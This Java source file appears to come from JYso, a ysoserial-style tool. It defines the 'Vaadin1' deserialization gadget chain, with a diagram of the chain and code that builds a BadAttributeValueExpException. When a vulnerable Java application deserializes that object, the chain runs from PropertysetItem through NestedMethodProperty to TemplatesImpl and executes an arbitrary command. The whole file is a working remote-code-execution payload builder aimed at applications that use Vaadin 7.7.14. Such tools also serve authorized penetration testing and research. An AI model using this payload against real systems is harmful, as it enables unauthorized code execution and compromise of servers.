package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.JavaVersion;
import com.qi4l.JYso.gadgets.utils.Reflections;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;


/**
 * +-------------------------------------------------+
 * |                                                 |
 * |  BadAttributeValueExpException                  |
 * |                                                 |
 * |  val ==>  PropertysetItem                       |
 * |                                                 |
 * |  readObject() ==> val.toString()                |
 * |          +                                      |
 * +----------|--------------------------------------+
 * |
 * |
 * |
 * +----|-----------------------------------------+
 * |    v                                         |
 * |  PropertysetItem                             |
 * |                                              |
 * |  toString () => getPropertyId().getValue ()  |
 * |                                       +      |
 * +---------------------------------------|------+
 * |
 * +-----------------------------+
 * |
 * +-----|----------------------------------------------+
 * |     v                                              |
 * |  NestedMethodProperty                              |
 * |                                                    |
 * |  getValue() => java.lang.reflect.Method.invoke ()  |
 * |                                           |        |
 * +-------------------------------------------|--------+
 * |
 * +-----------------------------------+
 * |
 * +---|--------------------------------------------+
 * |   v                                            |
 * |  TemplatesImpl.getOutputProperties()           |
 * |                                                |
 * +------------------------------------------------+
 */
@SuppressWarnings({"unused"})
@Dependencies({"com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14"})
@Authors({Authors.KULLRICH})
public class Vaadin1 implements ObjectPayload<Object> {
    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    @Override
    public Object getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templates, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        BadAttributeValueExpException b = new BadAttributeValueExpException("");
        Reflections.setFieldValue(b, "val", pItem);

        return b;
    }
}
